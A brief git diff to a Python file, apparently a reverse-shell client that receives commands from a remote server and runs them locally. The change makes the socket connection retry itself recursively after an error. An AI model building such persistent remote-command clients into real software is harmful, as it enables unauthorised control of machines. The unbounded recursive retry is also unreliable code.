@@ -25,6 +25,7 @@ def socket_connect():
         s.connect((host, port))
     except socket.error as msg:
         print("Socket connection error: " + str(msg))
+        socket_connect()
 
 
 # Receive commands from remote server and run on local machine
